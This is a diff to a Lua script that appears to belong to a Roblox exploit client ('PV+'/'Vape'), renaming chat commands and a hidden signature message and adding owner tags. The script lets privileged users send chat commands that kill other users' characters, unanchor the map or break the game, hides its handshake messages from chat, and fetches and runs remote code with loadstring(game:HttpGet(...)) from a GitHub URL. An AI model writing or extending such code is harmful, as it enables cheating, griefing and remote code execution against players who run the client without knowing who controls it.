@@ -53,7 +53,7 @@ local commands = {
 			game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
 		end
 	end,
-	[";vid"] = function()
+	[";video"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			local filename = "bruh"
 			local ScreenGui = Instance.new("ScreenGui")
@@ -83,7 +83,7 @@ local commands = {
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			local textChatService = game:GetService("TextChatService")
 			wait(0.0001)
-			textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("Im Using PV+ Made By Mario")
+			textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("I Using PV+")
 		end
 	end,
 	[";void"] = function()
@@ -138,17 +138,6 @@ local commands = {
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/RickRoll"))()
 		end
 	end,
-	[";uninject"] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			GuiLibrary.SelfDestruct()
-		end
-	end,
-	[";antivape"] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		repeat
-			GuiLibrary.SelfDestruct()
-		end
-	end,
 	[";freeze"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = true
@@ -182,7 +171,7 @@ local commands = {
 			end
 		end
 	end,
-	[";destroygame"] = function()
+	[";bgame"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			pcall(function()
 				local replicatedStorage = game:GetService("ReplicatedStorage")
@@ -192,7 +181,7 @@ local commands = {
 			end)
 		end
 	end,
-	[";deletemap"] = function()
+	[";bmap"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			local function unanchorParts(object)
 				if object:IsA("BasePart") then
@@ -269,7 +258,7 @@ task.spawn(function()
 			if not CanAttackUser(plr) then
 				local oldchannel = textChatService.ChatInputBarConfiguration.TargetTextChannel
 				local newchannel = game:GetService("RobloxReplicatedStorage").ExperienceChat.WhisperChat:InvokeServer(plr.UserId)
-				newchannel:SendAsync("PV+ Is Good")
+				newchannel:SendAsync("ALAAZA")
 				table.insert(private,plr)
 				task.wait(1)
 				textChatService.ChatInputBarConfiguration.TargetTextChannel = oldchannel
@@ -294,12 +283,12 @@ txt.OnIncomingMessage = function(msg)
 		end
 		local otherPriority, plrattackable, plrtag = WhitelistFunctions:GetWhitelist(plr2)
 		if CanAttackUser(plr2) and plr2 ~= lplr then
-			if message.Text:find("PV+ Is Good") then
-				warningNotification("PV+ Notify",plr2.Name.." is using PV+!",60)
+			if message.Text:find("ALAAZA") then
+				warningNotification("Vape",plr2.Name.." is using SP+!",60)
 				table.insert(users,plr2.UserId)
 			end
 		end
-		if message.Text:find("PV+ Is Good") or message.Text:lower():find("privately") then
+		if message.Text:find("ALAAZA") or message.Text:lower():find("privately") then
 			p.PrefixText = ""
 			return p
 		end
@@ -331,17 +320,17 @@ txt.OnIncomingMessage = function(msg)
 			["white"] = "#ffffff",
 		}
 		if CanAttackUser(plr2) and plr2 ~= lplr then
-			if message.Text:find("PV+ Is Good") then
-				warningNotification("PV+ Notify",plr2.Name.." is using PV+!",60)
+			if message.Text:find("ALAAZA") then
+				warningNotification("Vape",plr2.Name.." is using SP+!",60)
 				table.insert(users,plr2.UserId)
 				table.insert(whitelist["tags"],{
 					userid = plr2.UserId,
-					color = "red",
+					color = "yellow",
 					tag = "PV+ USER"
 				})
 			end
 		end
-		if message.Text:lower():find("pv+ is good") or message.Text:lower():find("you are now privately chatting") then 
+		if message.Text:lower():find("alaaza") or message.Text:lower():find("you are now privately chatting") then 
 			p.PrefixText = ""
 			msg.Text = ""
 			return p
@@ -368,7 +357,7 @@ txt.OnIncomingMessage = function(msg)
 		local userType = 0
 		local hasTag = false
 		if users[plr2.UserId] ~= nil then
-			p.PrefixText = "<font color='"..colors["red"].."'>[PV+ USER]</font> " .. msg.PrefixText
+			p.PrefixText = "<font color='"..colors["yellow"].."'>[PV+ USER]</font> " .. msg.PrefixText
 			hasTag = true
 			return p
 		end
@@ -383,5 +372,30 @@ txt.OnIncomingMessage = function(msg)
 			end
 		end
 
-	return p
+		if whitelist["Private"] ~= nil then
+			for i, v in pairs(whitelist["Private"]) do
+				if v.id == userId then
+					if not hasTag then
+						hasTag = true
+						p.PrefixText = "<font color='"..colors["purple"].."'>[PV+ PRIVATE]</font> " .. msg.PrefixText
+					end
+					userType = 1
+				end
+			end
 		end
+
+		if whitelist["Mario"] ~= nil then
+			for i, v in pairs(whitelist["Mario"]) do
+				if v.id == userId then
+					if not hasTag then
+						hasTag = true
+						p.PrefixText = "<font color='"..colors["pink"].."'>[PV+ OWNER]</font> " .. msg.PrefixText
+					end
+					userType = 2
+				end
+			end
+		end
+	end
+
+	return p
+end
